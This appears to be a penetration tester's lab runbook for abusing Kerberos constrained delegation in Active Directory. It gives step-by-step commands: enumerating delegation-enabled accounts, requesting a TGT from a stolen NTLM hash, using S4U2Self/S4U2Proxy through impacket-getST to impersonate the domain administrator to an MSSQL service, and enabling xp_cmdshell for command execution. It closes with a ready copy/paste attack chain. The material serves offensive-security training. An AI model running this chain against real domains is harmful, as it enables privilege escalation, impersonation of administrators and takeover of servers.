# Kerberos Constrained Delegation - Runbook

## Quick Reference

|Item|Value|
|---|---|
|SPN attribute (on object)|`serviceprincipalname`|
|Delegation target attribute|`msds-allowedtodelegateto`|
|Key flag|`TRUSTED_TO_AUTH_FOR_DELEGATION`|
|Ticket file extension|`.ccache`|
|Environment variable|`KRB5CCNAME`|
## Concept Summary

**Constrained Delegation** allows a service account to impersonate ANY user to specific services listed in `msds-allowedtodelegateto`.

**Attack path:**
1. Compromise account with constrained delegation configured
2. Use S4U2Self to get a ticket impersonating any user (e.g., Domain Admin)
3. Use S4U2Proxy to request a ticket to the target service as that user
4. Access the target service as Domain Admin
## Step 1: Enumerate Constrained Delegation (Windows)

```powershell
cd C:\Tools
Get-DomainUser -TrustedToAuth
```

**What to look for:**

|Field|Meaning|
|---|---|
|`samaccountname`|Target account (e.g., `iissvc`)|
|`serviceprincipalname`|SPNs registered ON this account|
|`msds-allowedtodelegateto`|Services this account can delegate TO|
|`TRUSTED_TO_AUTH_FOR_DELEGATION`|S4U2Self works without user interaction|

## Step 2: Setup Kali DNS

```bash
sudo sh -c 'echo "nameserver <DC_IP>" > /etc/resolv.conf'
```

Verify:

```bash
nslookup corp.com
ping -c 2 <DC_IP>
```

## Step 3: Get TGT for Compromised Account

```bash
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP>
```

Example:

```bash
impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9 -dc-ip 192.168.175.100
```

If using password instead:

```bash
impacket-getTGT corp.com/iissvc:'Password123' -dc-ip 192.168.175.100
```

## Step 4: Export TGT

```bash
export KRB5CCNAME=<USER>.ccache
```

Example:

```bash
export KRB5CCNAME=iissvc.ccache
```

## Step 5: S4U Attack - Impersonate Administrator

```bash
impacket-getST -spn <TARGET_SPN> -impersonate administrator <DOMAIN>/<USER> -k -no-pass -dc-ip <DC_IP>
```

Example:

```bash
impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass -dc-ip 192.168.175.100
```

> [!warning] Note the output filename - it's NOT `administrator.ccache`! Output will say: `Saving ticket in administrator@mssqlsvc_sql01.corp.com:1433@CORP.COM.ccache`

## Step 6: Export Administrator Ticket

Use the **exact filename** from the previous step:

```bash
export KRB5CCNAME='administrator@mssqlsvc_sql01.corp.com:1433@CORP.COM.ccache'
```

## Step 7: Access Target Service

For MSSQL:

```bash
impacket-mssqlclient <TARGET_HOST>.<DOMAIN> -k -no-pass -dc-ip <DC_IP>
```
Example:

```bash
impacket-mssqlclient sql01.corp.com -k -no-pass -dc-ip 192.168.175.100
```
## Step 8: Get Shell via MSSQL

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
## Full Attack Chain (Copy/Paste Template)

```bash
# 1. Set DNS
sudo sh -c 'echo "nameserver <DC_IP>" > /etc/resolv.conf'
# 2. Get TGT
impacket-getTGT <DOMAIN>/<USER> -hashes :<HASH> -dc-ip <DC_IP>
# 3. Export TGT
export KRB5CCNAME=<USER>.ccache
# 4. S4U Attack
impacket-getST -spn <TARGET_SPN> -impersonate administrator <DOMAIN>/<USER> -k -no-pass -dc-ip <DC_IP>
# 5. Export admin ticket (use EXACT filename from step 4 output)
export KRB5CCNAME='<EXACT_FILENAME_FROM_OUTPUT>'
# 6. Connect to service
impacket-mssqlclient <TARGET>.<DOMAIN> -k -no-pass -dc-ip <DC_IP>
```
## Troubleshooting

|Issue|Solution|
|---|---|
|Command hangs|Add `-dc-ip <DC_IP>` to all Impacket commands|
|"No such file" on ticket|Check exact filename from getST output|
|Clock skew error|`sudo ntpdate <DC_IP>`|
|DNS fails|Verify `/etc/resolv.conf` has DC IP|
## Key Lessons Learned

1. **ALWAYS use `-dc-ip`** - prevents hanging
2. **Ticket filenames vary** - check getST output for exact name
3. **Lab hashes are provided** - don't overthink finding them
4. **`serviceprincipalname`** = SPNs on the object
5. **`msds-allowedtodelegateto`** = SPNs the object can delegate to